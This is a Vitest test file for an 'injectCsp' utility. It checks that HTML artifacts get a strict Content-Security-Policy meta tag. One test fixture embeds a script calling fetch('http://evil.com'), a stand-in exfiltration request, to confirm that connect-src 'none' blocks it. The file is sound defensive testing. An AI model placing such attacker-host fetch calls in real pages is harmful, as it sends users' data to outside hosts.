import { describe, it, expect } from "vitest";
import { injectCsp } from "$lib/utils/html-security";

describe("HtmlArtifactViewer - CSP Security & Isolation", () => {
  it("injects CSP meta tag inside existing <head>", () => {
    const raw =
      "<!DOCTYPE html><html><head><title>Test</title></head><body><h1>Hello</h1></body></html>";
    const result = injectCsp(raw);
    expect(result).toContain('<meta http-equiv="Content-Security-Policy"');
    expect(result).toContain("default-src 'none'");
    expect(result).toContain("script-src 'unsafe-inline'");
    expect(result).toContain("connect-src 'none'");
    expect(result).toContain("form-action 'none'");
    expect(result).toContain("object-src 'none'");
    expect(result).toContain("base-uri 'none'");
    expect(result).toContain("frame-ancestors 'none'");
    expect(result).toContain("worker-src 'none'");
    expect(result).toContain("manifest-src 'none'");
    expect(result).toContain("<title>Test</title>");
  });

  it("creates <head> inside existing <html> if missing", () => {
    const raw = "<html><body><h1>Hello</h1></body></html>";
    const result = injectCsp(raw);
    expect(result).toContain('<head>\n  <meta http-equiv="Content-Security-Policy"');
    expect(result).toContain("</head>");
    expect(result).toContain("<body><h1>Hello</h1></body>");
  });

  it("prepends <head> with CSP if no html or head tags", () => {
    const raw = "<div>Snippet without html tag</div>";
    const result = injectCsp(raw);
    expect(result.startsWith('<head>\n  <meta http-equiv="Content-Security-Policy"')).toBe(true);
    expect(result).toContain("<div>Snippet without html tag</div>");
  });

  it("handles empty html input", () => {
    const result = injectCsp("");
    expect(result).toContain('<meta http-equiv="Content-Security-Policy"');
  });

  it("enforces strict isolation directives that block network exfiltration and origin access", () => {
    const raw = "<html><head></head><body><script>fetch('http://evil.com');</script></body></html>";
    const secured = injectCsp(raw);
    // Verified that connect-src 'none' blocks fetch/xhr/websocket
    expect(secured).toContain("connect-src 'none'");
    // Verified that default-src 'none' blocks external fonts, frames, objects
    expect(secured).toContain("default-src 'none'");
    // Verified form submission is disabled
    expect(secured).toContain("form-action 'none'");
    // Verified embedded objects and worker/manifest loading are disabled.
    expect(secured).toContain("object-src 'none'");
    expect(secured).toContain("worker-src 'none'");
    expect(secured).toContain("manifest-src 'none'");
  });
});
